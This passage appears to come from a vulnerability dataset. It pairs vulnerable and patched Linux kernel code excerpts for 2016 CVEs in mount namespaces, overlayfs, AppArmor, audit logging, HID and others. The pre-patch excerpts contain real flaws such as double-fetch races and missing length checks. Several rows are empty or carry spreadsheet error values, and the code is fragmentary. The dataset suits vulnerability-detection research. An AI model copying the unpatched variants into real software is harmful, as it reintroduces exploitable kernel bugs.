 struct srpt_device *sdev;
 struct srpt_rdma_ch *ch;
 struct srpt_send_ioctx *target;
 int ret, i;

	ret = -EINVAL;
	ch = ioctx->ch;
 BUG_ON(!ch);
 BUG_ON(!ch->sport);
	sdev = ch->sport->sdev;
 BUG_ON(!sdev);
 spin_lock_irq(&sdev->spinlock);
 for (i = 0; i < ch->rq_size; ++i) {
		target = ch->ioctx_ring[i];
 if (target->cmd.se_lun == ioctx->cmd.se_lun &&
		    target->cmd.tag == tag &&
 srpt_get_cmd_state(target) != SRPT_STATE_DONE) {
			ret = 0;
 /* now let the target core abort &target->cmd; */
 break;
		}
	}
 spin_unlock_irq(&sdev->spinlock);
 return ret;
}

static int srp_tmr_to_tcm(int fn)
{
 switch (fn) {
 struct se_cmd *cmd;
 struct se_session *sess = ch->sess;
 uint64_t unpacked_lun;
 uint32_t tag = 0;
 int tcm_tmr;
 int rc;

 srpt_set_cmd_state(send_ioctx, SRPT_STATE_MGMT);
	send_ioctx->cmd.tag = srp_tsk->tag;
	tcm_tmr = srp_tmr_to_tcm(srp_tsk->tsk_mgmt_func);
 if (tcm_tmr < 0) {
		send_ioctx->cmd.se_tmr_req->response =
			TMR_TASK_MGMT_FUNCTION_NOT_SUPPORTED;
 goto fail;
	}
	unpacked_lun = srpt_unpack_lun((uint8_t *)&srp_tsk->lun,
 sizeof(srp_tsk->lun));

 if (srp_tsk->tsk_mgmt_func == SRP_TSK_ABORT_TASK) {
		rc = srpt_rx_mgmt_fn_tag(send_ioctx, srp_tsk->task_tag);
 if (rc < 0) {
			send_ioctx->cmd.se_tmr_req->response =
					TMR_TASK_DOES_NOT_EXIST;
 goto fail;
		}
		tag = srp_tsk->task_tag;
	}
	rc = target_submit_tmr(&send_ioctx->cmd, sess, NULL, unpacked_lun,
				srp_tsk, tcm_tmr, GFP_KERNEL, tag,
				TARGET_SCF_ACK_KREF);
 if (rc != 0) {
		send_ioctx->cmd.se_tmr_req->response = TMR_FUNCTION_REJECTED;
"," return -1;
}










































static int srp_tmr_to_tcm(int fn)
{
 switch (fn) {
 struct se_cmd *cmd;
 struct se_session *sess = ch->sess;
 uint64_t unpacked_lun;

 int tcm_tmr;
 int rc;

 srpt_set_cmd_state(send_ioctx, SRPT_STATE_MGMT);
	send_ioctx->cmd.tag = srp_tsk->tag;
	tcm_tmr = srp_tmr_to_tcm(srp_tsk->tsk_mgmt_func);





	unpacked_lun = srpt_unpack_lun((uint8_t *)&srp_tsk->lun,
 sizeof(srp_tsk->lun));










	rc = target_submit_tmr(&send_ioctx->cmd, sess, NULL, unpacked_lun,
				srp_tsk, tcm_tmr, GFP_KERNEL, srp_tsk->task_tag,
				TARGET_SCF_ACK_KREF);
 if (rc != 0) {
		send_ioctx->cmd.se_tmr_req->response = TMR_FUNCTION_REJECTED;
"
2016,DoS ,CVE-2016-6213,"
==============================================================









2. /proc/sys/fs/binfmt_misc
----------------------------------------------------------
	u64			seq;	/* Sequence number to prevent loops */
 wait_queue_head_t poll;
	u64 event;


};

struct mnt_pcp {
#include ""pnode.h""
#include ""internal.h""




static unsigned int m_hash_mask __read_mostly;
static unsigned int m_hash_shift __read_mostly;
static unsigned int mp_hash_mask __read_mostly;

 list_splice(&head, n->list.prev);




 attach_shadowed(mnt, parent, shadows);
 touch_mnt_namespace(n);
}
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {

 bool disconnect;
		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
 __touch_mnt_namespace(p->mnt_ns);




		p->mnt_ns = NULL;
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;
 return 0;
}























/*
 *  @source_mnt : mount tree to be attached
 *  @nd         : place the mount tree @source_mnt is attached
 struct path *parent_path)
{
 HLIST_HEAD(tree_list);

 struct mount *child, *p;
 struct hlist_node *n;
 int err;








 if (IS_MNT_SHARED(dest_mnt)) {
		err = invent_group_ids(source_mnt, true);
 if (err)
 out_cleanup_ids:
 while (!hlist_empty(&tree_list)) {
		child = hlist_entry(tree_list.first, struct mount, mnt_hash);

 umount_tree(child, UMOUNT_SYNC);
	}
 unlock_mount_hash();
 cleanup_group_ids(source_mnt, NULL);
 out:

 return err;
}

	new_ns->event = 0;
	new_ns->user_ns = get_user_ns(user_ns);
	new_ns->ucounts = ucounts;


 return new_ns;
}

	q = new;
 while (p) {
		q->mnt_ns = new_ns;

 if (new_fs) {
 if (&p->mnt == new_fs->root.mnt) {
				new_fs->root.mnt = mntget(&q->mnt);
 struct mount *mnt = real_mount(m);
		mnt->mnt_ns = new_ns;
		new_ns->root = mnt;

 list_add(&mnt->mnt_list, &new_ns->list);
	} else {
 mntput(m);
 read_sequnlock_excl(&mount_lock);
	}
 hlist_add_head(&child->mnt_hash, list);
 return 0;
}

/*
struct mount *copy_tree(struct mount *, struct dentry *, int);
bool is_path_reachable(struct mount *, struct dentry *,
 const struct path *root);

#endif /* _LINUX_PNODE_H */

extern dev_t name_to_dev_t(const char *name);



#endif /* _LINUX_MOUNT_H */
#include <linux/sched/sysctl.h>
#include <linux/kexec.h>
#include <linux/bpf.h>


#include <asm/uaccess.h>
#include <asm/processor.h>
		.mode		= 0644,
		.proc_handler	= proc_doulongvec_minmax,
	},








	{ }
};

","
==============================================================

mount-max:

This denotes the maximum number of mounts that may exist
in a mount namespace.

==============================================================


2. /proc/sys/fs/binfmt_misc
----------------------------------------------------------
	u64			seq;	/* Sequence number to prevent loops */
 wait_queue_head_t poll;
	u64 event;
 unsigned int		mounts; /* # of mounts in the namespace */
 unsigned int		pending_mounts;
};

struct mnt_pcp {
#include ""pnode.h""
#include ""internal.h""

/* Maximum number of mounts in a mount namespace */
unsigned int sysctl_mount_max __read_mostly = 100000;

static unsigned int m_hash_mask __read_mostly;
static unsigned int m_hash_shift __read_mostly;
static unsigned int mp_hash_mask __read_mostly;

 list_splice(&head, n->list.prev);

	n->mounts += n->pending_mounts;
	n->pending_mounts = 0;

 attach_shadowed(mnt, parent, shadows);
 touch_mnt_namespace(n);
}
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {
 struct mnt_namespace *ns;
 bool disconnect;
		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
		ns = p->mnt_ns;
 if (ns) {
			ns->mounts--;
 __touch_mnt_namespace(ns);
		}
		p->mnt_ns = NULL;
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;
 return 0;
}

int count_mounts(struct mnt_namespace *ns, struct mount *mnt)
{
 unsigned int max = READ_ONCE(sysctl_mount_max);
 unsigned int mounts = 0, old, pending, sum;
 struct mount *p;

 for (p = mnt; p; p = next_mnt(p, mnt))
		mounts++;

	old = ns->mounts;
	pending = ns->pending_mounts;
	sum = old + pending;
 if ((old > sum) ||
	    (pending > sum) ||
	    (max < sum) ||
	    (mounts > (max - sum)))
 return -ENOSPC;

	ns->pending_mounts = pending + mounts;
 return 0;
}

/*
 *  @source_mnt : mount tree to be attached
 *  @nd         : place the mount tree @source_mnt is attached
 struct path *parent_path)
{
 HLIST_HEAD(tree_list);
 struct mnt_namespace *ns = dest_mnt->mnt_ns;
 struct mount *child, *p;
 struct hlist_node *n;
 int err;

 /* Is there space to add these mounts to the mount namespace? */
 if (!parent_path) {
		err = count_mounts(ns, source_mnt);
 if (err)
 goto out;
	}

 if (IS_MNT_SHARED(dest_mnt)) {
		err = invent_group_ids(source_mnt, true);
 if (err)
 out_cleanup_ids:
 while (!hlist_empty(&tree_list)) {
		child = hlist_entry(tree_list.first, struct mount, mnt_hash);
		child->mnt_parent->mnt_ns->pending_mounts = 0;
 umount_tree(child, UMOUNT_SYNC);
	}
 unlock_mount_hash();
 cleanup_group_ids(source_mnt, NULL);
 out:
	ns->pending_mounts = 0;
 return err;
}

	new_ns->event = 0;
	new_ns->user_ns = get_user_ns(user_ns);
	new_ns->ucounts = ucounts;
	new_ns->mounts = 0;
	new_ns->pending_mounts = 0;
 return new_ns;
}

	q = new;
 while (p) {
		q->mnt_ns = new_ns;
		new_ns->mounts++;
 if (new_fs) {
 if (&p->mnt == new_fs->root.mnt) {
				new_fs->root.mnt = mntget(&q->mnt);
 struct mount *mnt = real_mount(m);
		mnt->mnt_ns = new_ns;
		new_ns->root = mnt;
		new_ns->mounts++;
 list_add(&mnt->mnt_list, &new_ns->list);
	} else {
 mntput(m);
 read_sequnlock_excl(&mount_lock);
	}
 hlist_add_head(&child->mnt_hash, list);
 return count_mounts(m->mnt_ns, child);
}

/*
struct mount *copy_tree(struct mount *, struct dentry *, int);
bool is_path_reachable(struct mount *, struct dentry *,
 const struct path *root);
int count_mounts(struct mnt_namespace *ns, struct mount *mnt);
#endif /* _LINUX_PNODE_H */

extern dev_t name_to_dev_t(const char *name);

extern unsigned int sysctl_mount_max;

#endif /* _LINUX_MOUNT_H */
#include <linux/sched/sysctl.h>
#include <linux/kexec.h>
#include <linux/bpf.h>
#include <linux/mount.h>

#include <asm/uaccess.h>
#include <asm/processor.h>
		.mode		= 0644,
		.proc_handler	= proc_doulongvec_minmax,
	},
	{
		.procname	= ""mount-max"",
		.data		= &sysctl_mount_max,
		.maxlen		= sizeof(unsigned int),
		.mode		= 0644,
		.proc_handler	= proc_dointvec_minmax,
		.extra1		= &one,
	},
	{ }
};

"
2016,DoS ,CVE-2016-6198," bool new_is_dir = false;
 unsigned max_links = new_dir->i_sb->s_max_links;

 if (source == target)




 return 0;

	error = may_delete(old_dir, old_dentry, is_dir);
"," bool new_is_dir = false;
 unsigned max_links = new_dir->i_sb->s_max_links;

 /*
	 * Check source == target.
	 * On overlayfs need to look at underlying inodes.
 */
 if (vfs_select_inode(old_dentry, 0) == vfs_select_inode(new_dentry, 0))
 return 0;

	error = may_delete(old_dir, old_dentry, is_dir);
"
2016,DoS ,CVE-2016-6197,"{
 struct dentry *upperdir = ovl_dentry_upper(dentry->d_parent);
 struct inode *dir = upperdir->d_inode;
 struct dentry *upper = ovl_dentry_upper(dentry);
 int err;

 inode_lock_nested(dir, I_MUTEX_PARENT);






	err = -ESTALE;
 if (upper->d_parent == upperdir) {
 /* Don't let d_delete() think it can reset d_inode */
 dget(upper);
 if (is_dir)
			err = vfs_rmdir(dir, upper);
 else
			err = vfs_unlink(dir, upper, NULL);
 dput(upper);
 ovl_dentry_version_inc(dentry->d_parent);
	}


 /*
	 * Keeping this dentry hashed would mean having to release
 */
 if (!err)
 d_drop(dentry);

 inode_unlock(dir);

 return err;

	trap = lock_rename(new_upperdir, old_upperdir);

	olddentry = ovl_dentry_upper(old);
	newdentry = ovl_dentry_upper(new);
 if (newdentry) {
















 if (opaquedir) {
			newdentry = opaquedir;
 opaquedir = NULL;
		} else {
 dget(newdentry);

		}
	} else {
		new_create = true;
		newdentry = lookup_one_len(new->d_name.name, new_upperdir,
					   new->d_name.len);
		err = PTR_ERR(newdentry);
 if (IS_ERR(newdentry))
 goto out_unlock;
	}

	err = -ESTALE;
 if (olddentry->d_parent != old_upperdir)
 goto out_dput;
 if (newdentry->d_parent != new_upperdir)
 goto out_dput;
 if (olddentry == trap)
 goto out_dput;
 if (newdentry == trap)

out_dput:
 dput(newdentry);


out_unlock:
 unlock_rename(new_upperdir, old_upperdir);
out_revert_creds:
","{
 struct dentry *upperdir = ovl_dentry_upper(dentry->d_parent);
 struct inode *dir = upperdir->d_inode;
 struct dentry *upper;
 int err;

 inode_lock_nested(dir, I_MUTEX_PARENT);
	upper = lookup_one_len(dentry->d_name.name, upperdir,
			       dentry->d_name.len);
	err = PTR_ERR(upper);
 if (IS_ERR(upper))
 goto out_unlock;

	err = -ESTALE;
 if (upper == ovl_dentry_upper(dentry)) {


 if (is_dir)
			err = vfs_rmdir(dir, upper);
 else
			err = vfs_unlink(dir, upper, NULL);

 ovl_dentry_version_inc(dentry->d_parent);
	}
 dput(upper);

 /*
	 * Keeping this dentry hashed would mean having to release
 */
 if (!err)
 d_drop(dentry);
out_unlock:
 inode_unlock(dir);

 return err;

	trap = lock_rename(new_upperdir, old_upperdir);


	olddentry = lookup_one_len(old->d_name.name, old_upperdir,
				   old->d_name.len);
	err = PTR_ERR(olddentry);
 if (IS_ERR(olddentry))
 goto out_unlock;

	err = -ESTALE;
 if (olddentry != ovl_dentry_upper(old))
 goto out_dput_old;

	newdentry = lookup_one_len(new->d_name.name, new_upperdir,
				   new->d_name.len);
	err = PTR_ERR(newdentry);
 if (IS_ERR(newdentry))
 goto out_dput_old;

	err = -ESTALE;
 if (ovl_dentry_upper(new)) {
 if (opaquedir) {
 if (newdentry != opaquedir)
  goto out_dput;
		} else {
 if (newdentry != ovl_dentry_upper(new))
 goto out_dput;
		}
	} else {
		new_create = true;
 if (!d_is_negative(newdentry) &&
		    (!new_opaque || !ovl_is_whiteout(newdentry)))
 goto out_dput;


	}






 if (olddentry == trap)
 goto out_dput;
 if (newdentry == trap)

out_dput:
 dput(newdentry);
out_dput_old:
 dput(olddentry);
out_unlock:
 unlock_rename(new_upperdir, old_upperdir);
out_revert_creds:
"
2016,#NAME?,CVE-2016-6187,"{
 struct common_audit_data sa;
 struct apparmor_audit_data aad = {0,};
 char *command, *args = value;
 size_t arg_size;
 int error;

 if (size == 0)
 return -EINVAL;
 /* args points to a PAGE_SIZE buffer, AppArmor requires that
	 * the buffer must be null terminated or have size <= PAGE_SIZE -1
	 * so that AppArmor can null terminate them
 */
 if (args[size - 1] != '\0') {
 if (size == PAGE_SIZE)
 return -EINVAL;
		args[size] = '\0';
	}

 /* task can only write its own attributes */
 if (current != task)
 return -EACCES;

	args = value;










	args = strim(args);
	command = strsep(&args, "" "");
 if (!args)
 return -EINVAL;
	args = skip_spaces(args);
 if (!*args)
 return -EINVAL;

	arg_size = size - (args - (char *) value);
 if (strcmp(name, ""current"") == 0) {
 goto fail;
	} else
 /* only support the ""current"" and ""exec"" process attributes */
 return -EINVAL;

 if (!error)
		error = size;


 return error;

fail:
	aad.profile = aa_current_profile();
	aad.op = OP_SETPROCATTR;
	aad.info = name;
	aad.error = -EINVAL;
 aa_audit_msg(AUDIT_APPARMOR_DENIED, &sa, NULL);
 return -EINVAL;
}

static int apparmor_task_setrlimit(struct task_struct *task,
","{
 struct common_audit_data sa;
 struct apparmor_audit_data aad = {0,};
 char *command, *largs = NULL, *args = value;
 size_t arg_size;
 int error;

 if (size == 0)
 return -EINVAL;










 /* task can only write its own attributes */
 if (current != task)
 return -EACCES;

 /* AppArmor requires that the buffer must be null terminated atm */
 if (args[size - 1] != '\0') {
 /* null terminate */
		largs = args = kmalloc(size + 1, GFP_KERNEL);
 if (!args)
 return -ENOMEM;
 memcpy(args, value, size);
		args[size] = '\0';
	}

	error = -EINVAL;
	args = strim(args);
	command = strsep(&args, "" "");
 if (!args)
 goto out;
	args = skip_spaces(args);
 if (!*args)
 goto out;

	arg_size = size - (args - (char *) value);
 if (strcmp(name, ""current"") == 0) {
 goto fail;
	} else
 /* only support the ""current"" and ""exec"" process attributes */
 goto fail;

 if (!error)
		error = size;
out:
 kfree(largs);
 return error;

fail:
	aad.profile = aa_current_profile();
	aad.op = OP_SETPROCATTR;
	aad.info = name;
	aad.error = error = -EINVAL;
 aa_audit_msg(AUDIT_APPARMOR_DENIED, &sa, NULL);
 goto out;
}

static int apparmor_task_setrlimit(struct task_struct *task,
"
2016,DoS ,CVE-2016-6162,,
2016,DoS ,CVE-2016-6156," goto exit;
	}







	s_cmd->command += ec->cmd_offset;
	ret = cros_ec_cmd_xfer(ec->ec_dev, s_cmd);
 /* Only copy data to userland if data was received. */
 if (ret < 0)
 goto exit;

 if (copy_to_user(arg, s_cmd, sizeof(*s_cmd) + u_cmd.insize))
		ret = -EFAULT;
exit:
 kfree(s_cmd);
"," goto exit;
	}

 if (u_cmd.outsize != s_cmd->outsize ||
	    u_cmd.insize != s_cmd->insize) {
		ret = -EINVAL;
 goto exit;
	}

	s_cmd->command += ec->cmd_offset;
	ret = cros_ec_cmd_xfer(ec->ec_dev, s_cmd);
 /* Only copy data to userland if data was received. */
 if (ret < 0)
 goto exit;

 if (copy_to_user(arg, s_cmd, sizeof(*s_cmd) + s_cmd->insize))
		ret = -EFAULT;
exit:
 kfree(s_cmd);
"
2016,Bypass ,CVE-2016-6136,"#include <linux/compat.h>
#include <linux/ctype.h>
#include <linux/string.h>

#include <uapi/linux/limits.h>

#include ""audit.h""
#define AUDITSC_SUCCESS 1
#define AUDITSC_FAILURE 2

/* no execve audit message should be longer than this (userspace limits) */

#define MAX_EXECVE_AUDIT_LEN 7500

/* max length to print of cmdline/proctitle value during audit */
 return rc;
}

/*
 * to_send and len_sent accounting are very loose estimates.  We aren't
 * really worried about a hard cap to MAX_EXECVE_AUDIT_LEN so much as being
 * within about 500 bytes (next page boundary)
 *
 * why snprintf?  an int is up to 12 digits long.  if we just assumed when
 * logging that a[%d]= was going to be 16 characters long we would be wasting
 * space in every audit message.  In one 7500 byte message we can log up to
 * about 1000 min size arguments.  That comes down to about 50% waste of space
 * if we didn't do the snprintf to find out how long arg_num_len was.
 */
static int audit_log_single_execve_arg(struct audit_context *context,
 struct audit_buffer **ab,
 int arg_num,
 size_t *len_sent,
 const char __user *p,
 char *buf)
{
 char arg_num_len_buf[12];
 const char __user *tmp_p = p;
 /* how many digits are in arg_num? 5 is the length of ' a=""""' */
 size_t arg_num_len = snprintf(arg_num_len_buf, 12, ""%d"", arg_num) + 5;
 size_t len, len_left, to_send;
 size_t max_execve_audit_len = MAX_EXECVE_AUDIT_LEN;
 unsigned int i, has_cntl = 0, too_long = 0;
 int ret;

 /* strnlen_user includes the null we don't want to send */
	len_left = len = strnlen_user(p, MAX_ARG_STRLEN) - 1;

 /*
	 * We just created this mm, if we can't find the strings
	 * we just copied into it something is _very_ wrong. Similar
	 * for strings that are too long, we should not have created
	 * any.
 */
 if (WARN_ON_ONCE(len < 0 || len > MAX_ARG_STRLEN - 1)) {
 send_sig(SIGKILL, current, 0);
 return -1;










	}


 /* walk the whole argument looking for non-ascii chars */








 do {
 if (len_left > MAX_EXECVE_AUDIT_LEN)
			to_send = MAX_EXECVE_AUDIT_LEN;
 else
			to_send = len_left;
		ret = copy_from_user(buf, tmp_p, to_send);
 /*
		 * There is no reason for this copy to be short. We just
		 * copied them here, and the mm hasn't been exposed to user-
		 * space yet.
 */
 if (ret) {
 WARN_ON(1);
 send_sig(SIGKILL, current, 0);
 return -1;
		}
		buf[to_send] = '\0';
		has_cntl = audit_string_contains_control(buf, to_send);
 if (has_cntl) {
 /*
			 * hex messages get logged as 2 bytes, so we can only
			 * send half as much in each message
 */
			max_execve_audit_len = MAX_EXECVE_AUDIT_LEN / 2;
 break;
		}
		len_left -= to_send;
		tmp_p += to_send;
	} while (len_left > 0);

	len_left = len;

 if (len > max_execve_audit_len)
		too_long = 1;

 /* rewalk the argument actually logging the message */
 for (i = 0; len_left > 0; i++) {
 int room_left;

 if (len_left > max_execve_audit_len)
			to_send = max_execve_audit_len;
 else
			to_send = len_left;

 /* do we have space left to send this argument in this ab? */
		room_left = MAX_EXECVE_AUDIT_LEN - arg_num_len - *len_sent;
 if (has_cntl)
			room_left -= (to_send * 2);
 else
			room_left -= to_send;
 if (room_left < 0) {
			*len_sent = 0;
 audit_log_end(*ab);
			*ab = audit_log_start(context, GFP_KERNEL, AUDIT_EXECVE);
 if (!*ab)
 return 0;
		}

 /*
		 * first record needs to say how long the original string was
		 * so we can be sure nothing was lost.
 */
 if ((i == 0) && (too_long))
 audit_log_format(*ab, "" a%d_len=%zu"", arg_num,
					 has_cntl ? 2*len : len);

 /*
		 * normally arguments are small enough to fit and we already
		 * filled buf above when we checked for control characters
		 * so don't bother with another copy_from_user
 */
 if (len >= max_execve_audit_len)
			ret = copy_from_user(buf, p, to_send);
 else
			ret = 0;
 if (ret) {
 WARN_ON(1);
 send_sig(SIGKILL, current, 0);
 return -1;
		}
		buf[to_send] = '\0';

 /* actually log it */
 audit_log_format(*ab, "" a%d"", arg_num);
 if (too_long)
 audit_log_format(*ab, ""[%d]"", i);
 audit_log_format(*ab, ""="");
 if (has_cntl)
 audit_log_n_hex(*ab, buf, to_send);
 else
 audit_log_string(*ab, buf);

		p += to_send;
		len_left -= to_send;
		*len_sent += arg_num_len;
 if (has_cntl)
			*len_sent += to_send * 2;
 else
			*len_sent += to_send;
	}
 /* include the null we didn't log */
 return len + 1;
}

static void audit_log_execve_info(struct audit_context *context,
 struct audit_buffer **ab)
{
 int i, len;
 size_t len_sent = 0;
 const char __user *p;
 char *buf;








	p = (const char __user *)current->mm->arg_start;










































 audit_log_format(*ab, ""argc=%d"", context->execve.argc);









 /*
	 * we need some kernel buffer to hold the userspace args.  Just
	 * allocate one big one rather than allocating one of the right size
	 * for every single argument inside audit_log_single_execve_arg()
	 * should be <8k allocation so should be pretty safe.
 */
	buf = kmalloc(MAX_EXECVE_AUDIT_LEN + 1, GFP_KERNEL);
 if (!buf) {
 audit_panic(""out of memory for argv string"");
 return;
	}

 for (i = 0; i < context->execve.argc; i++) {
		len = audit_log_single_execve_arg(context, ab, i,
						  &len_sent, p, buf);
 if (len <= 0)
 break;
		p += len;
	}
 kfree(buf);
}

static void show_special(struct audit_context *context, int *call_panic)
","#include <linux/compat.h>
#include <linux/ctype.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <uapi/linux/limits.h>

#include ""audit.h""
#define AUDITSC_SUCCESS 1
#define AUDITSC_FAILURE 2

/* no execve audit message should be longer than this (userspace limits),
 * see the note near the top of audit_log_execve_info() about this value */
#define MAX_EXECVE_AUDIT_LEN 7500

/* max length to print of cmdline/proctitle value during audit */
 return rc;
}

static void audit_log_execve_info(struct audit_context *context,
 struct audit_buffer **ab)















{
 long len_max;
 long len_rem;
 long len_full;
 long len_buf;
 long len_abuf;
 long len_tmp;
 bool require_data;
 bool encode;
 unsigned int iter;
 unsigned int arg;
 char *buf_head;
 char *buf;
 const char __user *p = (const char __user *)current->mm->arg_start;

 /* NOTE: this buffer needs to be large enough to hold all the non-arg
	 *       data we put in the audit record for this argument (see the
	 *       code below) ... at this point in time 96 is plenty */
 char abuf[96];

 /* NOTE: we set MAX_EXECVE_AUDIT_LEN to a rather arbitrary limit, the
	 *       current value of 7500 is not as important as the fact that it
	 *       is less than 8k, a setting of 7500 gives us plenty of wiggle
	 *       room if we go over a little bit in the logging below */
 WARN_ON_ONCE(MAX_EXECVE_AUDIT_LEN > 7500);
	len_max = MAX_EXECVE_AUDIT_LEN;

 /* scratch buffer to hold the userspace args */
	buf_head = kmalloc(MAX_EXECVE_AUDIT_LEN + 1, GFP_KERNEL);
 if (!buf_head) {
 audit_panic(""out of memory for argv string"");
 return;
	}
	buf = buf_head;

 audit_log_format(*ab, ""argc=%d"", context->execve.argc);

	len_rem = len_max;
	len_buf = 0;
	len_full = 0;
	require_data = true;
	encode = false;
	iter = 0;
	arg = 0;
 do {
 /* NOTE: we don't ever want to trust this value for anything
		 *       serious, but the audit record format insists we
		 *       provide an argument length for really long arguments,
		 *       e.g. > MAX_EXECVE_AUDIT_LEN, so we have no choice but
		 *       to use strncpy_from_user() to obtain this value for
		 *       recording in the log, although we don't use it
		 *       anywhere here to avoid a double-fetch problem */
 if (len_full == 0)
			len_full = strnlen_user(p, MAX_ARG_STRLEN) - 1;

 /* read more data from userspace */
 if (require_data) {
 /* can we make more room in the buffer? */
 if (buf != buf_head) {
 memmove(buf_head, buf, len_buf);
				buf = buf_head;
			}

 /* fetch as much as we can of the argument */
			len_tmp = strncpy_from_user(&buf_head[len_buf], p,
						    len_max - len_buf);
 if (len_tmp == -EFAULT) {
 /* unable to copy from userspace */
 send_sig(SIGKILL, current, 0);
 goto out;
			} else if (len_tmp == (len_max - len_buf)) {
 /* buffer is not large enough */
				require_data = true;
 /* NOTE: if we are going to span multiple
				 *       buffers force the encoding so we stand
				 *       a chance at a sane len_full value and
				 *       consistent record encoding */
				encode = true;
				len_full = len_full * 2;
				p += len_tmp;
			} else {
				require_data = false;
 if (!encode)
					encode = audit_string_contains_control(
								buf, len_tmp);
 /* try to use a trusted value for len_full */
 if (len_full < len_max)
					len_full = (encode ?
						    len_tmp * 2 : len_tmp);
				p += len_tmp + 1;
			}
			len_buf += len_tmp;
			buf_head[len_buf] = '\0';









 /* length of the buffer in the audit record? */
			len_abuf = (encode ? len_buf * 2 : len_buf + 2);



















		}
























 /* write as much as we can to the audit log */
 if (len_buf > 0) {
 /* NOTE: some magic numbers here - basically if we
			 *       can't fit a reasonable amount of data into the
			 *       existing audit buffer, flush it and start with
			 *       a new buffer */
 if ((sizeof(abuf) + 8) > len_rem) {
				len_rem = len_max;
 audit_log_end(*ab);
				*ab = audit_log_start(context,
						      GFP_KERNEL, AUDIT_EXECVE);
 if (!*ab)
 goto out;
			}

 /* create the non-arg portion of the arg record */
			len_tmp = 0;
 if (require_data || (iter > 0) ||
			    ((len_abuf + sizeof(abuf)) > len_rem)) {
 if (iter == 0) {
					len_tmp += snprintf(&abuf[len_tmp],
 sizeof(abuf) - len_tmp,
 "" a%d_len=%lu"",
							arg, len_full);
				}
				len_tmp += snprintf(&abuf[len_tmp],
 sizeof(abuf) - len_tmp,
 "" a%d[%d]="", arg, iter++);
			} else
				len_tmp += snprintf(&abuf[len_tmp],
 sizeof(abuf) - len_tmp,
 "" a%d="", arg);
 WARN_ON(len_tmp >= sizeof(abuf));
			abuf[sizeof(abuf) - 1] = '\0';

 /* log the arg in the audit record */
 audit_log_format(*ab, ""%s"", abuf);
			len_rem -= len_tmp;
			len_tmp = len_buf;
 if (encode) {
 if (len_abuf > len_rem)
					len_tmp = len_rem / 2; /* encoding */
 audit_log_n_hex(*ab, buf, len_tmp);
				len_rem -= len_tmp * 2;
				len_abuf -= len_tmp * 2;
			} else {
 if (len_abuf > len_rem)
					len_tmp = len_rem - 2; /* quotes */
 audit_log_n_string(*ab, buf, len_tmp);
				len_rem -= len_tmp + 2;
 /* don't subtract the ""2"" because we still need
				 * to add quotes to the remaining string */
				len_abuf -= len_tmp;
			}
			len_buf -= len_tmp;
			buf += len_tmp;
		}

 /* ready to move to the next argument? */
 if ((len_buf == 0) && !require_data) {
			arg++;
			iter = 0;
			len_full = 0;
			require_data = true;
			encode = false;
		}
	} while (arg < context->execve.argc);

 /* NOTE: the caller handles the final audit_log_end() call */











out:
 kfree(buf_head);






}

static void show_special(struct audit_context *context, int *call_panic)
"
2016,#NAME?,CVE-2016-6130,"{
 struct sclp_ctl_sccb ctl_sccb;
 struct sccb_header *sccb;

 int rc;

 if (copy_from_user(&ctl_sccb, user_area, sizeof(ctl_sccb)))
	sccb = (void *) get_zeroed_page(GFP_KERNEL | GFP_DMA);
 if (!sccb)
 return -ENOMEM;
 if (copy_from_user(sccb, u64_to_uptr(ctl_sccb.sccb), sizeof(*sccb))) {



		rc = -EFAULT;
 goto out_free;
	}
 if (sccb->length > PAGE_SIZE || sccb->length < 8)
 return -EINVAL;
 if (copy_from_user(sccb, u64_to_uptr(ctl_sccb.sccb), sccb->length)) {
		rc = -EFAULT;
 goto out_free;
	}
	rc = sclp_sync_request(ctl_sccb.cmdw, sccb);
","{
 struct sclp_ctl_sccb ctl_sccb;
 struct sccb_header *sccb;
 unsigned long copied;
 int rc;

 if (copy_from_user(&ctl_sccb, user_area, sizeof(ctl_sccb)))
	sccb = (void *) get_zeroed_page(GFP_KERNEL | GFP_DMA);
 if (!sccb)
 return -ENOMEM;
	copied = PAGE_SIZE -
 copy_from_user(sccb, u64_to_uptr(ctl_sccb.sccb), PAGE_SIZE);
 if (offsetof(struct sccb_header, length) +
 sizeof(sccb->length) > copied || sccb->length > copied) {
		rc = -EFAULT;
 goto out_free;
	}
 if (sccb->length < 8) {
		rc = -EINVAL;


 goto out_free;
	}
	rc = sclp_sync_request(ctl_sccb.cmdw, sccb);
"
2017,DoS ,CVE-2016-5870,,
2017,#NAME?,CVE-2016-5856,,
2016,DoS Overflow ,CVE-2016-5829," goto inval;
			} else if (uref->usage_index >= field->report_count)
 goto inval;

 else if ((cmd == HIDIOCGUSAGES || cmd == HIDIOCSUSAGES) &&
				 (uref_multi->num_values > HID_MAX_MULTI_USAGES ||
				  uref->usage_index + uref_multi->num_values > field->report_count))
 goto inval;
		}






 switch (cmd) {
 case HIDIOCGUSAGE:
			uref->value = field->value[uref->usage_index];
"," goto inval;
			} else if (uref->usage_index >= field->report_count)
 goto inval;





		}

 if ((cmd == HIDIOCGUSAGES || cmd == HIDIOCSUSAGES) &&
		    (uref_multi->num_values > HID_MAX_MULTI_USAGES ||
		     uref->usage_index + uref_multi->num_values > field->report_count))
 goto inval;

 switch (cmd) {
 case HIDIOCGUSAGE:
			uref->value = field->value[uref->usage_index];
"
2016,DoS ,CVE-2016-5828,,
2016,DoS Overflow Mem. Corr. +Info ,CVE-2016-5728,"			ret = -EFAULT;
 goto free_ret;
		}





 mutex_lock(&vdev->vdev_mutex);
 mutex_lock(&vi->vop_mutex);
		ret = vop_virtio_add_device(vdev, dd_config);
","			ret = -EFAULT;
 goto free_ret;
		}
 /* Ensure desc has not changed between the two reads */
 if (memcmp(&dd, dd_config, sizeof(dd))) {
			ret = -EINVAL;
 goto free_ret;
		}
 mutex_lock(&vdev->vdev_mutex);
 mutex_lock(&vi->vop_mutex);
		ret = vop_virtio_add_device(vdev, dd_config);
"
2016,#NAME?,CVE-2016-5696,"EXPORT_SYMBOL(sysctl_tcp_adv_win_scale);

/* rfc5961 challenge ack rate limiting */
int sysctl_tcp_challenge_ack_limit = 100;

int sysctl_tcp_stdurg __read_mostly;
int sysctl_tcp_rfc1337 __read_mostly;
 static u32 challenge_timestamp;
